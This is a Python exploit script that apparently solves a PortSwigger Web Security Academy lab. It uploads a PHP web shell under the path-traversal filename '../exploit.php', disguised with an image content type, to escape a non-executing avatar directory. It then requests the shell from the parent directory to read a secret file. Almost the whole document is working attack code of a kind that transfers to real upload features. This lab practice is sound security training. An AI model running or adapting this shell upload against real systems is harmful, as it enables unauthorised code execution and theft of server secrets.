# Lab 03 — Web shell upload via path traversal
# PortSwigger: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
#
# Vulnerability: Script execution is disabled specifically within
#                /files/avatars/, but NOT within its parent /files/
#                directory — and the filename field determines the save
#                path unsanitised
# Aim:           Upload a basic PHP web shell and exfiltrate
#                /home/carlos/secret
#
# Technique:
#   A normal PHP upload to /files/avatars/ is saved but NOT executed
#   (returns raw source as text). Using a filename with a path traversal
#   sequence saves the file one directory up, in /files/, which has no
#   such execution restriction.
#
# Usage: python file_upload_lab03.py <url>

import sys
import urllib3
from proxies import proxies
from file_upload_utils import (banner, section, make_session, login,
                                PHP_PAYLOAD, upload_avatar, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 03 — WEB SHELL UPLOAD VIA PATH TRAVERSAL")

    if len(sys.argv) != 2:
        print("  Usage: python file_upload_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm normal upload is saved but NOT executed ──────────────
    print("\n  ── Step 1: confirm a normal PHP upload is saved but not executed\n")
    upload_avatar(session, url, "exploit.php", PHP_PAYLOAD, content_type="image/jpeg")
    r_normal = session.get(f"{url}/files/avatars/exploit.php")
    print(f"  ℹ  GET /files/avatars/exploit.php → status {r_normal.status_code}")
    if "<?php" in r_normal.text:
        print("  ✔  Confirmed: raw PHP source returned as text (NOT executed)\n")
    else:
        print(f"  ℹ  Response: {r_normal.text[:200]}\n")

    # ── Step 2: re-upload with a path-traversal filename ──────────────────────
    print("  ── Step 2: re-upload with filename '../exploit.php'\n")
    r_traversal = upload_avatar(session, url, "../exploit.php", PHP_PAYLOAD, content_type="image/jpeg")
    check_status(r_traversal, [200, 302], "Upload with path-traversal filename")

    # ── Step 3: request from the parent /files/ directory instead ────────────
    print("\n  ── Step 3: request the file from /files/ (parent directory)\n")
    r_exec = session.get(f"{url}/files/exploit.php")
    check_status(r_exec, 200, "GET /files/exploit.php")

    print_box("LEAKED SECRET", r_exec.text.strip())

    print()
    print("  ℹ  /files/avatars/ blocked execution; its parent /files/ didn't.")
    print("     The filename field controlling the SAVE path let us escape")
    print("     the restricted directory entirely — same primitive as the")
    print("     dedicated Path Traversal module, applied to an upload path.")
